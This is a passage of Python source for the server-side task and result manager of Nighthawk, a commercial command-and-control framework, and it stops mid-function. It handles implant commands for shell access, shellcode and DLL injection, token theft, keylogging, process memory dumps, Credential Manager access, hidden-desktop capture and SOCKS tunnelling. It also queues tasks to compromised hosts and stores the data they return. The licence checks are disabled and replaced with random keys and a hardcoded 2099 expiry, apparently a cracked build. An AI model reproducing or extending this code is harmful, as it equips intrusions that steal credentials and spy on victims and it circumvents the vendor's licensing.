# Copyright 2022 MDSec Consulting Ltd
# Use of this source code is governed by an End User License Agreement,
# details of this agreement can be found in EULA.pdf
# Nighthawk (r)

from threading import Lock
from collections import namedtuple, OrderedDict
from datetime import datetime, timedelta
from base64 import b64decode, b64encode
from copy import copy
import uuid
import struct
import json
import threading
import time
import hashlib
import os
import shutil
import sockshandler

import database
from database import ServerType
from helpers import convert_from_file_time, convert_to_file_time

LICENSE_FILENAME = "nighthawk_license.bin"
LICENSE_FILE_LENGTH = 72

VERSION_FILENAME = "nighthawk_version.bin"
VERSION_FILE_LENGTH = 3

PROTOMSG_HEADER_LENGTH = 48

class ECommsProtocolMessageType(object):
	CPMT_TUNNEL = 0
	CPMT_SHELL = 1
	CPMT_GETDRIVES = 2
	CPMT_GETDIR = 3
	CPMT_GET_FILEDETAILS = 4
	CPMT_GET_FILEPART = 5
	CPMT_PUT_FILEPART = 6
	CPMT_UPDATE_CONFIG = 7
	CPMT_SOCKS_MSG = 8
	CPMT_GET_DETAILED_INFO = 9
	CPMT_EXECUTE_ASSEMBLY = 10
	CPMT_IMPERSONATE_USER = 11
	CPMT_REVERT_TO_SELF = 12
	CPMT_CHANGE_DIRECTORY = 13
	CPMT_PRINT_DIRECTORY = 14
	CPMT_WHOAMI = 15
	CPMT_MIGRATE = 16
	CPMT_INJECT_RDLL = 17
	CPMT_RUNAS_USER = 18
	CPMT_ENUM_PROCESSES = 19
	CPMT_MOVE_FILE = 20
	CPMT_DELETE_FILE = 21
	CPMT_COPY_FILE = 22
	CPMT_TERMINATE_PROCESS = 23
	CPMT_READ_NAMED_PIPE = 24
	CPMT_STEAL_PROCESS_TOKEN = 25
	CPMT_SWITCH_TO_STORED_TOKEN = 26
	CPMT_LIST_STORED_TOKENS = 27
	CPMT_DELETE_STORED_TOKEN = 28
	CPMT_CLEAR_STORED_TOKENS = 29
	CPMT_INJECT_SHELLCODE = 30
	CPMT_ENUMERATE_PRIVILEGES = 31
	CPMT_ENABLE_PRIVILEGE = 32
	CPMT_DISABLE_PRIVILEGE = 33
	CPMT_HIBERNATION_STATUS = 34
	CPMT_EXECUTE_BOF = 35
	CPMT_LOGONS = 36
	CPMT_LUA = 37
	CPMT_PIPELIST = 38
	CPMT_PROFLIST = 39
	CPMT_WINDOWLIST = 40
	CPMT_APPLIST = 41
	CPMT_PORTLIST = 42
	CPMT_SERVICELIST = 43
	CPMT_THREADLIST = 44
	CPMT_MODULELIST = 45
	CPMT_HANDLELIST = 46
	CPMT_OBJECTLIST = 47
	CPMT_KEYLOGGER = 48
	CPMT_CAPTURE_WINDOW = 49
	CPMT_PROCDUMP = 50
	CPMT_CREDMAN = 51
	CPMT_IMPERSONATE_SYSTEM = 52
	CPMT_IMPERSONATE_VIRTUAL = 53
	CPMT_TOKEN_INFORMATION = 54
	CMPT_UNLINK = 55
	CPMT_CREATE_DIRECTORY = 56
	CPMT_REMOVE_DIRECTORY = 57
	CPMT_GET_CONFIG = 58
	CPMT_LIST_CANCELLABLE_TASKS = 59
	CPMT_CANCEL_TASK = 60
	CPMT_HIDDEN_DESKTOP = 61
	CPMT_EXECUTE_EXE = 62
	CPMT_P2P_MESH_UPDATE = 63

	@staticmethod
	def name(value):
		return {
				ECommsProtocolMessageType.CPMT_TUNNEL: "CPMT_TUNNEL",
				ECommsProtocolMessageType.CPMT_SHELL: "CPMT_SHELL",
				ECommsProtocolMessageType.CPMT_GETDRIVES: "CPMT_GETDRIVES",
				ECommsProtocolMessageType.CPMT_GETDIR: "CPMT_GETDIR",
				ECommsProtocolMessageType.CPMT_GET_FILEDETAILS: "CPMT_GET_FILEDETAILS",
				ECommsProtocolMessageType.CPMT_GET_FILEPART: "CPMT_GET_FILEPART",
				ECommsProtocolMessageType.CPMT_PUT_FILEPART: "CPMT_PUT_FILEPART",
				ECommsProtocolMessageType.CPMT_UPDATE_CONFIG: "CPMT_UPDATE_CONFIG",
				ECommsProtocolMessageType.CPMT_SOCKS_MSG: "CPMT_SOCKS_MSG",
				ECommsProtocolMessageType.CPMT_GET_DETAILED_INFO: "CPMT_GET_DETAILED_INFO",
				ECommsProtocolMessageType.CPMT_EXECUTE_ASSEMBLY: "CPMT_EXECUTE_ASSEMBLY",
				ECommsProtocolMessageType.CPMT_IMPERSONATE_USER: "CPMT_IMPERSONATE_USER",
				ECommsProtocolMessageType.CPMT_REVERT_TO_SELF: "CPMT_REVERT_TO_SELF",
				ECommsProtocolMessageType.CPMT_CHANGE_DIRECTORY: "CPMT_CHANGE_DIRECTORY",
				ECommsProtocolMessageType.CPMT_PRINT_DIRECTORY: "CPMT_PRINT_DIRECTORY",
				ECommsProtocolMessageType.CPMT_WHOAMI: "CPMT_WHOAMI",
				ECommsProtocolMessageType.CPMT_MIGRATE: "CPMT_MIGRATE",
				ECommsProtocolMessageType.CPMT_INJECT_RDLL: "CPMT_INJECT_RDLL",
				ECommsProtocolMessageType.CPMT_RUNAS_USER: "CPMT_RUNAS_USER",
				ECommsProtocolMessageType.CPMT_ENUM_PROCESSES: "CPMT_ENUM_PROCESSES",
				ECommsProtocolMessageType.CPMT_MOVE_FILE: "CPMT_MOVE_FILE",
				ECommsProtocolMessageType.CPMT_DELETE_FILE: "CPMT_DELETE_FILE",
				ECommsProtocolMessageType.CPMT_COPY_FILE: "CPMT_COPY_FILE",
				ECommsProtocolMessageType.CPMT_TERMINATE_PROCESS: "CPMT_TERMINATE_PROCESS",
				ECommsProtocolMessageType.CPMT_READ_NAMED_PIPE: "CPMT_READ_NAMED_PIPE",
				ECommsProtocolMessageType.CPMT_STEAL_PROCESS_TOKEN: "CPMT_STEAL_PROCESS_TOKEN",
				ECommsProtocolMessageType.CPMT_SWITCH_TO_STORED_TOKEN: "CPMT_SWITCH_TO_STORED_TOKEN",
				ECommsProtocolMessageType.CPMT_LIST_STORED_TOKENS: "CPMT_LIST_STORED_TOKENS",
				ECommsProtocolMessageType.CPMT_DELETE_STORED_TOKEN: "CPMT_DELETE_STORED_TOKEN",
				ECommsProtocolMessageType.CPMT_CLEAR_STORED_TOKENS: "CPMT_CLEAR_STORED_TOKENS",
				ECommsProtocolMessageType.CPMT_INJECT_SHELLCODE: "CPMT_INJECT_SHELLCODE",
				ECommsProtocolMessageType.CPMT_ENUMERATE_PRIVILEGES: "CPMT_ENUMERATE_PRIVILEGES",
				ECommsProtocolMessageType.CPMT_ENABLE_PRIVILEGE: "CPMT_ENABLE_PRIVILEGE",
				ECommsProtocolMessageType.CPMT_DISABLE_PRIVILEGE: "CPMT_DISABLE_PRIVILEGE",
				ECommsProtocolMessageType.CPMT_HIBERNATION_STATUS: "CPMT_HIBERNATION_STATUS",
				ECommsProtocolMessageType.CPMT_EXECUTE_BOF: "CPMT_EXECUTE_BOF",
				ECommsProtocolMessageType.CPMT_LOGONS: "CPMT_LOGONS",
				ECommsProtocolMessageType.CPMT_LUA: "CPMT_LUA",
				ECommsProtocolMessageType.CPMT_PIPELIST: "CPMT_PIPELIST",
				ECommsProtocolMessageType.CPMT_PROFLIST: "CPMT_PROFLIST",
				ECommsProtocolMessageType.CPMT_WINDOWLIST: "CPMT_WINDOWLIST",
				ECommsProtocolMessageType.CPMT_APPLIST: "CPMT_APPLIST",
				ECommsProtocolMessageType.CPMT_PORTLIST: "CPMT_PORTLIST",
				ECommsProtocolMessageType.CPMT_SERVICELIST: "CPMT_SERVICELIST",
				ECommsProtocolMessageType.CPMT_THREADLIST: "CPMT_THREADLIST",
				ECommsProtocolMessageType.CPMT_MODULELIST: "CPMT_MODULELIST",
				ECommsProtocolMessageType.CPMT_HANDLELIST: "CPMT_HANDLELIST",
				ECommsProtocolMessageType.CPMT_OBJECTLIST: "CPMT_OBJECTLIST",
				ECommsProtocolMessageType.CPMT_KEYLOGGER: "CPMT_KEYLOGGER",
				ECommsProtocolMessageType.CPMT_CAPTURE_WINDOW: "CPMT_CAPTURE_WINDOW",
				ECommsProtocolMessageType.CPMT_PROCDUMP: "CPMT_PROCDUMP",
				ECommsProtocolMessageType.CPMT_CREDMAN: "CPMT_CREDMAN",
				ECommsProtocolMessageType.CPMT_IMPERSONATE_SYSTEM: "CPMT_IMPERSONATE_SYSTEM",
				ECommsProtocolMessageType.CPMT_IMPERSONATE_VIRTUAL: "CPMT_IMPERSONATE_VIRTUAL",
				ECommsProtocolMessageType.CPMT_TOKEN_INFORMATION: "CPMT_TOKEN_INFORMATION",
				ECommsProtocolMessageType.CMPT_UNLINK: "CMPT_UNLINK",
				ECommsProtocolMessageType.CPMT_CREATE_DIRECTORY: "CPMT_CREATE_DIRECTORY",
				ECommsProtocolMessageType.CPMT_REMOVE_DIRECTORY: "CPMT_REMOVE_DIRECTORY",
				ECommsProtocolMessageType.CPMT_GET_CONFIG: "CPMT_GET_CONFIG",
				ECommsProtocolMessageType.CPMT_LIST_CANCELLABLE_TASKS: "CPMT_LIST_CANCELLABLE_TASKS",
				ECommsProtocolMessageType.CPMT_CANCEL_TASK: "CPMT_CANCEL_TASK",
				ECommsProtocolMessageType.CPMT_HIDDEN_DESKTOP: "CPMT_HIDDEN_DESKTOP",
				ECommsProtocolMessageType.CPMT_EXECUTE_EXE: "CPMT_EXECUTE_EXE"
			}[value]

class EHiddenDesktopCommandType(object):
	START = 0
	STOP = 1
	STATUS = 2
	CAPTURE = 3
	INPUT = 4

	@staticmethod
	def name(value):
		return {
				EHiddenDesktopCommandType.START: "START",
				EHiddenDesktopCommandType.STOP: "STOP",
				EHiddenDesktopCommandType.STATUS: "STATUS",
				EHiddenDesktopCommandType.CAPTURE: "CAPTURE",
				EHiddenDesktopCommandType.INPUT: "INPUT",
			}[value]

class HiddenDesktopInput(object):
	def __init__(self, cmd_type, desktop_name = "", input_type = "", input_key = "", coord_x = 0, coord_y = 0):
		self.CommandType = cmd_type
		self.DesktopName = desktop_name
		self.InputType = input_type
		self.InputKey = input_key
		self.X = coord_x
		self.Y = coord_y
		return

class QueuedCommand(object):
	def __init__(self, client_id, msg_id, payload, result = None):
		self.ClientId = client_id # string GUID without enclosing {...}
		self.MessageId = msg_id   # string GUID without enclosing {...}
		self.Payload = payload   # base64 encoded c2 protocol command message
		self.Result = result     # base64 encoded c2 protocol response message
		return

class QueuedAction(object):
	def __init__(self, listener_name, action):
		self.ListenerName = listener_name # listener the action pertains to
		self.Action = action              # embedded action payload (usually a string)
		return

class ClientActivity(object):
	def __init__(self, client_id, timestamp, ip, listener_name):
		self.ClientId = client_id
		self.TimeStamp = timestamp
		self.IP = ip
		self.DetailedInfo = None
		self.ListenerName = listener_name
		return

class ConsoleDelta(object):
	def __init__(self, timestamp, client_id, delta_id, type, data):
		self.TimeStampUtc = timestamp
		self.ClientId = client_id
		self.DeltaId = delta_id
		self.DeltaType = type
		self.DeltaData = data
		return

class HiddenDesktopStatus(object):
	def __init__(self, is_active, desktop_name, timestamp_utc):
		self.IsActive = is_active
		self.DesktopName = desktop_name
		self.CaptureImage = None
		self.InProgressCapture = None # tuple(str(capture-guid), int(num-chunks), {0: "...", 1:"...", ..., int(num-chunks): "xxx"}) 
		self.TimestampUtc = timestamp_utc
		return

class HiddenDesktopCaptureParams(object):
	def __init__(self, chunk_size = 8192 * 1024, quality = 10):
		self.CaptureQuality = quality
		self.CaptureChunkSize = chunk_size
		return

class ApiManager(object):
	__instance = None
	__ARTIFACT_PATH = "./artifacts/"
	__TEMP_PATH = "./temp/"

	@staticmethod
	def get_instance():
		if not ApiManager.__instance:
			ApiManager.__instance = ApiManager()
		return ApiManager.__instance
	
	def __init__(self):
		self.__db = None
		self.__debug = False
		self.__trace = False

		self.__pending_transmit = {}    # mapping {str(client_id): OrderedDict(str(msg_id), None)} # ordered dict provides O(1) search and removal
		self.__pending_transmit_qc = {} # mapping {str(msg_id): QueuedCommand}
		
		self.__pending_results = {}     # mapping {str(client_id): OrderedDict(str(msg_id), None)}
		self.__pending_results_qc = {}  # mapping {str(msg_id): QueuedCommand}

		self.__queued_results = OrderedDict() # mapping {str(msg_id): [QueuedCommand]} # list to allow multiple for e.g. realtime inproc
		
		self.__client_socks_handlers = {} # {str(client_id): C2SocksDaemon} # to stop/start SOCKS on client
		self.__socks_conn_id_handlers = {} # {str(conn_id): C2SocksHandler} # to feed new SOCKS messages direct to client

		self.__queued_broadcast_results = []
		self.__pending_control_actions = []
		self.__deployed_c2s = []
		self.__client_activity = []
		self.__console_delta_map = {}
		self.__hd_last_captures = {} # mapping {str(client_id) : HiddenDesktopStatus()}
		self.__hd_capture_params = {} # mapping {str(client_id): HiddenDesktopCaptureParams()}
		self.__peer_mesh = {}

		self._lock_pending_transmit = Lock()
		self._lock_pending_results = Lock()
		self._lock_queued_results = Lock()
		self._lock_queued_broadcast_results = Lock()
		self._lock_pending_control_actions = Lock()
		self._lock_deployed_c2s = Lock()
		self._lock_client_activity = Lock()
		self._lock_console_delta = Lock()
		self._lock_hd_last_captures = Lock()
		self._lock_peer_mesh = Lock()
		self._lock_client_socks_handlers = Lock()
		self._lock_socks_conn_id_handlers = Lock()

		sockshandler.set_api_manager(self)
		return
	
	def print_stats(self):
		while True:
			time.sleep(10)

			s = """
	[API SERVER]
	| Pending: transmit %u, results %u, control actions %u
	| Queued:  results %u
	| Client Activity count: %u
	| Console Delta count: %u (total messages %u)
	| SOCKS ConnId count: %u
		""" % (
				sum([len(od.keys()) for od in self.__pending_transmit.itervalues()]),
				sum([len(od.keys()) for od in self.__pending_results.itervalues()]),
				len(self.__pending_control_actions),
				sum([len(l) for l in self.__queued_results.itervalues()]),
				len(self.__client_activity),
				len(self.__console_delta_map),
				sum(sorted(filter(lambda x : x != 0, [len(z) for z in self.__console_delta_map.itervalues()]), key=lambda y : -y)),
				len(self.__socks_conn_id_handlers))
			print s
		return

	def __add_license_key(self, payload):
		# license_key = "\x00" * LICENSE_FILE_LENGTH

		# try:
		# 	with open(LICENSE_FILENAME, "rb") as f:
		# 		data = f.read()

		# 		if len(data) >= LICENSE_FILE_LENGTH:
		# 			license_key = data[0 : LICENSE_FILE_LENGTH]
		# except IOError:
		# 	pass


		license_key = os.urandom(LICENSE_FILE_LENGTH)



		payload = b64decode(payload)
		payload_len = struct.unpack("<I", payload[0x2c:0x30])[0]
		payload_len += LICENSE_FILE_LENGTH
		payload = payload[:0x2c] + struct.pack("<I", payload_len) + license_key + payload[0x30:]

		return b64encode(payload)

	def set_debug(self, debug):
		self.__debug = debug
		return

	def set_trace(self, trace):
		self.__trace = trace

		if self.__trace:
			t = threading.Thread(target=self.print_stats)
			t.start()
		
		return

	def get_debug(self):
		return self.__debug
	
	def get_trace(self):
		return self.__trace

	def set_database(self, name):
		self.__db = database.Database.get_instance(name)
		return

	def erase_db(self):
		self.__db.erase_db()
		return

	def setup_user(self, username, password):
		self.__db.setup_user(username, password)
		return

	def campaign_exists(self):
		return self.__db.campaign_exists()

	def get_c2s_from_database(self):
		return self.__db.get_c2s()

	def get_console_deltas_from_database(self):
		return self.__db.get_console_deltas()

	def restore_campaign(self, restore_c2s):
		existing_c2 = self.get_c2s_from_database()
		
		for server in existing_c2:
			timestamp = server[0]
			
			if timestamp not in restore_c2s:
				continue

			server_type = server[1]
			listener_name = server[2]
			secret = server[3]
			profile = server[4]
			active = server[5]

			if server_type == ServerType.DEPLOYED:
				self.control_deployc2(listener_name, secret, json.loads(profile), True)
			elif server_type == ServerType.ADOPTED:
				self.control_adoptc2(listener_name, secret, json.loads(profile), True)

		pending_transmit = self.__db.get_queued_commands()

		#for command in pending_transmit:
		#	client_id = command[0]
		#	msg_id = command[1]
		#	payload = command[2]
		#
		#	self.__pending_transmit.setdefault(client_id, OrderedDict())[msg_id] = None
		#	self.__pending_transmit_qc[msg_id] = QueuedCommand(client_id, msg_id, payload)

		console_deltas = self.get_console_deltas_from_database()
		
		for client_id,deltas in console_deltas.iteritems():
			for delta in deltas:
				try:
					timestamp = datetime.strptime(delta[0], "%Y-%m-%d %H:%M:%S.%f")
				except ValueError:
					timestamp = datetime.strptime(delta[0], "%Y-%m-%d %H:%M:%S")

				delta_id = delta[2]
				type = delta[3]
				data = delta[4]
				
				delta = ConsoleDelta(timestamp, client_id, delta_id, type, data)
				self.__console_delta_map.setdefault(client_id,[]).append(delta)
		return

	def get_customer_info(self):
		customer_info = {}

		

		# try:
		# 	with open(VERSION_FILENAME, "rb") as f:
		# 		data = f.read()
		# 		if len(data) == VERSION_FILE_LENGTH:
		# 			major = ord(data[0])
		# 			minor = ord(data[1])
		# 			build = ord(data[2])
		# 			version = "v%u.%u.%u" % (major, minor, build)
		# 			customer_info["version"] = version
		# except:
		# 	pass

		# try:
		# 	with open(LICENSE_FILENAME, "rb") as f:
		# 		data = f.read()

		# 		if len(data) > LICENSE_FILE_LENGTH:
		# 			expiration = ""
		# 			try:
		# 				expiration = convert_from_file_time(struct.unpack("<Q", data[LICENSE_FILE_LENGTH - 8: LICENSE_FILE_LENGTH])[0])
		# 				customer_info["license_exp"] = str(expiration)
		# 			except:
		# 				pass

		# 			try:
		# 				customer_name = data[LICENSE_FILE_LENGTH:]
		# 				customer_info["customer_name"] = customer_name
		# 			except:
		# 				pass
		# except IOError:
		# 	pass


		customer_info = {}
		customer_info["version"] = "v0.2.1"
		customer_info["license_exp"] = "2099-12-31 23:59:59.000000"
		customer_info["customer_name"] = "Askyeye"

		return customer_info

	def register_socks_conn(self, conn_id, handler):
		with self._lock_socks_conn_id_handlers:
			self.__socks_conn_id_handlers[conn_id] = handler
		return

	def unregister_socks_conn(self, conn_id):
		with self._lock_socks_conn_id_handlers:
			if conn_id in self.__socks_conn_id_handlers:
				del self.__socks_conn_id_handlers[conn_id]
		return

# used by routes in c2resources
	
	def c2_listcommands(self, client_id):
		with self._lock_pending_transmit:
			return self.__pending_transmit.setdefault(client_id, OrderedDict()).keys() # return: [str(msg_id),...]
	
	def c2_getcommand(self, msg_id):
		with self._lock_pending_transmit:
			if msg_id not in self.__pending_transmit_qc:
				return
		
			qc = self.__pending_transmit_qc[msg_id]
			
			# remove from both queues
			del self.__pending_transmit[qc.ClientId][msg_id]
			del self.__pending_transmit_qc[msg_id]
		
		with self._lock_pending_results:
			self.__pending_results.setdefault(qc.ClientId, OrderedDict())[msg_id] = None
			self.__pending_results_qc[msg_id] = qc
		
		self.__db.log_command(qc)
		self.__db.remove_queued_command(qc)
		return qc.Payload
	
	def __partial_base64_decode(self, payload, length):
		header_approx = payload[:length * 4]
		for i in xrange(4):
			for j in xrange(4):
				try:
					payload = b64decode(payload + ("A" * i) + ("=" * j))
					return payload[:length]
				except:
					pass
		return

	def __is_protocol_msg_type(self, payload, type):
		msg_header = self.__partial_base64_decode(payload, 50)
		
		if len(msg_header) < PROTOMSG_HEADER_LENGTH:
			return

		msg_type = struct.unpack("<I", msg_header[40:44])[0]
		
		if msg_type != type:
			return

		return True

	def __process_hidden_desktop_message(self, comms_msg):
		#print "[ENTERED] __process_hidden_desktop_message; comms_msg length = %u, comms_msg = %s" % (len(comms_msg), comms_msg[:100] + ("..." if len(comms_msg) > 100 else ""))

		if not self.__is_protocol_msg_type(comms_msg, ECommsProtocolMessageType.CPMT_HIDDEN_DESKTOP):
			return

		comms_msg = b64decode(comms_msg)
		
		client_id = str(uuid.UUID(bytes=bytes(bytearray(struct.unpack("<16B", comms_msg[0:16]))))).lower()
		if not client_id:
			#print "[__process_hidden_desktop_message] missing client id"
			return

		#print "[__process_hidden_desktop_message] client id is %s" % (client_id)

		cmd_type = struct.unpack("<I", comms_msg[48:52])[0]

		#print "[__process_hidden_desktop_message] cmd_type = %s" % (EHiddenDesktopCommandType.name(cmd_type))

		desktop_name_length = struct.unpack("<I", comms_msg[52:56])[0]
		desktop_name = comms_msg[56:56 + desktop_name_length] # ascii
		success = ord(comms_msg[56 + desktop_name_length])
		last_error = struct.unpack("<I", comms_msg[57 + desktop_name_length: 61 + desktop_name_length])[0]
		
		#print "[__process_hidden_desktop_message] cmd_type = %s, desktop_name = %s, success = %s, last_error = %u" % (
		#		EHiddenDesktopCommandType.name(cmd_type),
		#		desktop_name,
		#		str(success),
		#		last_error
		#	)

		# error but the command was processed ok
		if not success:
			return True

		if cmd_type == EHiddenDesktopCommandType.START:
			with self._lock_hd_last_captures:
				self.__hd_last_captures[client_id] = HiddenDesktopStatus(True, desktop_name, datetime.utcnow())

			#print "[__process_hidden_desktop_message] [START] sending CAPTURE command"
			self.__push_hiddendesktop_command(client_id, HiddenDesktopInput(EHiddenDesktopCommandType.CAPTURE, desktop_name))

		elif cmd_type == EHiddenDesktopCommandType.STOP:
			with self._lock_hd_last_captures:
				last_cap = None

				if client_id in self.__hd_last_captures:
					last_cap = self.__hd_last_captures[client_id]
				#	print "[__process_hidden_desktop_message] [STOP] client id %s IS in last captures" % (client_id)
				#else:
				#	print "[__process_hidden_desktop_message] [STOP] client id %s is NOT in last captures" % (client_id)

				if last_cap:
					last_cap.IsActive = False
				else:
					self.__hd_last_captures[client_id] = HiddenDesktopStatus(False, desktop_name, datetime.utcnow())
		elif cmd_type == EHiddenDesktopCommandType.STATUS:
			is_active = bool(ord(comms_msg[61 + desktop_name_length]))

			#print "[__process_hidden_desktop_message] [STATUS] is_active = %s" % (str(is_active))

			with self._lock_hd_last_captures:
				last_cap = None

				if client_id in self.__hd_last_captures:
					last_cap = self.__hd_last_captures[client_id]
				#	print "[__process_hidden_desktop_message] [STATUS] client id %s IS in last captures" % (client_id)
				#else:
				#	print "[__process_hidden_desktop_message] [STATUS] client id %s is NOT in last captures" % (client_id)

				if last_cap:
					last_cap.IsActive = is_active
				else:
					self.__hd_last_captures[client_id] = HiddenDesktopStatus(is_active, desktop_name, datetime.utcnow())

		elif cmd_type == EHiddenDesktopCommandType.CAPTURE:
			capture_guid = str(uuid.UUID(bytes=bytes(bytearray(struct.unpack("<16B", comms_msg[61 + desktop_name_length: 77 + desktop_name_length]))))).lower()
			chunks_total = struct.unpack("<I", comms_msg[77 + desktop_name_length: 81 + desktop_name_length])[0]
			current_chunk = struct.unpack("<I", comms_msg[81 + desktop_name_length: 85 + desktop_name_length])[0]
			capture_length = struct.unpack("<I", comms_msg[85 + desktop_name_length: 89 + desktop_name_length])[0]
			capture_image = comms_msg[89 + desktop_name_length: 89 + desktop_name_length + capture_length]

			#print "[__process_hidden_desktop_message] [CAPTURE] capture_guid = %s, chunks_total = %u, current_chunk = %u, capture_image length is %u first bytes %s" % (
			#	capture_guid, chunks_total, current_chunk, len(capture_image), b64encode(capture_image[0:100]) + "..."
			#	)

			last_cap = None

			with self._lock_hd_last_captures:
				if client_id in self.__hd_last_captures:
					#print "[__process_hidden_desktop_message] [CAPTURE] client id %s IS in last captures" % (client_id)
					last_cap = self.__hd_last_captures[client_id]
				else:
					#print "[__process_hidden_desktop_message] [CAPTURE] client id %s *IS NOT* in last captures" % (client_id)
					last_cap = HiddenDesktopStatus(False, desktop_name, datetime.utcnow())
					self.__hd_last_captures[client_id] = last_cap

			if not last_cap.InProgressCapture or last_cap.InProgressCapture[0] != capture_guid:
				#print "[__process_hidden_desktop_message] [CAPTURE] resetting last_cap.InProgressCapture (capture guid = %s, chunks total = %u)" % (capture_guid, chunks_total)
				last_cap.InProgressCapture = (capture_guid, chunks_total, {}) # reset if new guid, something went wrong

			# last_cap.InProgressCapture[1] is total number of chunks as initially determined

			if current_chunk < last_cap.InProgressCapture[1]:
				#print "[__process_hidden_desktop_message] [CAPTURE] adding chunk %u of %u total (capture guid = %s)" % (current_chunk, chunks_total, capture_guid)
				last_cap.InProgressCapture[2][current_chunk] = capture_image

			if len(last_cap.InProgressCapture[2]) >= last_cap.InProgressCapture[1]: # we have all the chunks
				#print "[__process_hidden_desktop_message] [CAPTURE] we have all chunks, saving new capture (capture guid = %s)" % (capture_guid)
				full_capture = ""
				for i in xrange(last_cap.InProgressCapture[1]):
					full_capture += last_cap.InProgressCapture[2][i]
				
				last_cap.CaptureImage = full_capture
				last_cap.TimestampUtc = datetime.utcnow()
				
				if last_cap.IsActive:
					#print "[__process_hidden_desktop_message] [CAPTURE] sending CAPTURE command"
					self.__push_hiddendesktop_command(client_id, HiddenDesktopInput(EHiddenDesktopCommandType.CAPTURE, desktop_name))
		elif cmd_type == EHiddenDesktopCommandType.INPUT:
			pass

		return True

	def __process_procdump_result_message(self, comms_msg):
		"""
		bool success = br.ReadBoolean();
        var id = new Guid(br.ReadBytes(16));
        int pid = br.ReadInt32();
        int offset = br.ReadInt32();
        int total = br.ReadInt32();
        byte[] data = br.ReadBytes(br.ReadInt32());
		"""

		if not self.__is_protocol_msg_type(comms_msg, ECommsProtocolMessageType.CPMT_PROCDUMP):
			return

		#print "[ENTERED] __process_procdump_result_message; comms_msg length = %u, comms_msg = %s" % (len(comms_msg), comms_msg[:100] + ("..." if len(comms_msg) > 100 else ""))

		comms_msg = b64decode(comms_msg)
		
		#print "[__process_procdump_result_message] client id is %s" % (client_id)

		success = struct.unpack("<B", comms_msg[48:49])[0]

		if not success:
			# let this get reported back to UI
			return

		dump_id = str(uuid.UUID(bytes=bytes(bytearray(struct.unpack("<16B", comms_msg[49:65]))))).lower()
		if not dump_id:
			return

		offset = struct.unpack("<I", comms_msg[69:73])[0]
		total = struct.unpack("<I", comms_msg[73:77])[0]
		chunk_size = struct.unpack("<I", comms_msg[77:81])[0]

		dump_path = ApiManager.__TEMP_PATH + dump_id + ".dmp"
		
		with open(dump_path, "wb" if not os.path.exists(dump_path) else "a+b") as f:
			#print "__process_procdump_result_message; writing out chunk of size %u" % (chunk_size)
			f.write(comms_msg[81:81 + chunk_size])

		return True

	def __process_p2p_mesh_message(self, comms_msg):
		
		if not self.__is_protocol_msg_type(comms_msg, ECommsProtocolMessageType.CPMT_P2P_MESH_UPDATE):
			return

		comms_msg = b64decode(comms_msg)
		
		client_id = str(uuid.UUID(bytes_le=bytes(bytearray(struct.unpack("<16B", comms_msg[0:16]))))).lower()
		if not client_id:
			return

		connected = ord(comms_msg[48])
		peer_id = str(uuid.UUID(bytes_le=bytes(bytearray(struct.unpack("<16B", comms_msg[49:49 + 16]))))).lower()
		if not peer_id:
			return

		with self._lock_peer_mesh:
			for k in self.__peer_mesh:
				if peer_id in self.__peer_mesh[k]:
					self.__peer_mesh[k].remove(peer_id)

			self.__peer_mesh.setdefault(client_id,[])
			
			if connected:
				self.__peer_mesh[client_id].append(peer_id)

		return True

	def __process_socks_message(self, comms_msg):
		
		if not self.__is_protocol_msg_type(comms_msg, ECommsProtocolMessageType.CPMT_SOCKS_MSG):
			return

		comms_msg = b64decode(comms_msg)
		
		client_id = str(uuid.UUID(bytes_le=bytes(bytearray(struct.unpack("<16B", comms_msg[0:16]))))).lower()
		if not client_id:
			return

		conn_id = str(uuid.UUID(bytes_le=bytes(bytearray(struct.unpack("<16B", comms_msg[48:64]))))).lower()
		if not conn_id:
			return

		handler = None

		with self._lock_socks_conn_id_handlers:
			if conn_id in self.__socks_conn_id_handlers:
				handler = self.__socks_conn_id_handlers[conn_id]

		if handler:
			handler.notify_message(comms_msg)

		return True

	def c2_putresult(self, client_id, msg_id, payload):
		with self._lock_pending_results:
			qc = self.__pending_results_qc.setdefault(msg_id, QueuedCommand(client_id, msg_id, None, None))
			qc.Result = payload
			
			# remove from both queues
			if client_id in self.__pending_results and msg_id in self.__pending_results[client_id]:
				del self.__pending_results[client_id][msg_id]
			del self.__pending_results_qc[msg_id]

		if self.__process_p2p_mesh_message(payload):
			return True
		elif self.__process_procdump_result_message(payload):
			# dump data has been written to procdump file so strip from queued result
			payload = b64encode(self.__partial_base64_decode(payload, 81))
		elif self.__process_hidden_desktop_message(payload):
			return True
		elif self.__process_socks_message(payload):
			return True
		
		with self._lock_queued_results:
			self.__queued_results.setdefault(msg_id, []).append(qc)
		
		# this only makes sense in the context on non-SOCKS commands
		self.__db.update_command_result(qc)
		return True
	
	def c2_notifyactivity(self, client_id, listener_name, ip):
		with self._lock_client_activity:
			matches = filter(lambda ca : ca.ClientId == client_id, self.__client_activity)

		if matches:
			ca = matches[0] # only one entry is allowed per client_id combo
			ca.TimeStamp = datetime.now()
			ca.IP = ip # may change
			ca.ListenerName = listener_name # may change
		else:
			ca = ClientActivity(client_id, datetime.now(), ip, listener_name)
		
		with self._lock_client_activity:
			for item in matches:
				self.__client_activity.remove(item)

		with self._lock_client_activity:
			self.__client_activity.append(ca)

		self.__db.update_last_client_activity(ca)
		return
	
# used by routes in sessionresources
	
	def session_putcommand(self, client_id, msg_id, payload):
		payload = self.__add_license_key(payload)

		qc = QueuedCommand(client_id, msg_id, payload)

		with self._lock_pending_transmit:
			self.__pending_transmit.setdefault(client_id, OrderedDict())[msg_id] = None
			self.__pending_transmit_qc[msg_id] = qc

		self.__db.add_queued_command(qc)
		return True
	
	def session_clearcommands(self, client_id, msg_id):
		with self._lock_pending_transmit:
			if msg_id == "all":
				for msg_id in self.__pending_transmit.setdefault(client_id, OrderedDict()).iterkeys():
					self.__db.remove_queued_command(self.__pending_transmit_qc[msg_id])

				del self.__pending_transmit[client_id]
				self.__db.clear_queued_commands(client_id)
			else:
				if msg_id in self.__pending_transmit.setdefault(client_id, OrderedDict()):
					del self.__pending_transmit[client_id][msg_id]

				if msg_id in self.__pending_transmit_qc:
					self.__db.remove_queued_command(self.__pending_transmit_qc[msg_id])
					del self.__pending_transmit_qc[msg_id]
		return

	def session_listresults(self):
		expiration = datetime.now() + timedelta(seconds=30)
		while datetime.now() < expiration:
			with self._lock_queued_results:
				if self.__queued_results:
					return filter(lambda msg_id : self.__queued_results[msg_id], self.__queued_results.keys())
			time.sleep(0.1)
		return []
	
	def __rebuild_procdump_result_message(self, comms_msg):
		"""
		bool success = br.ReadBoolean();
        var id = new Guid(br.ReadBytes(16));
        int pid = br.ReadInt32();
        int offset = br.ReadInt32();
        int total = br.ReadInt32();
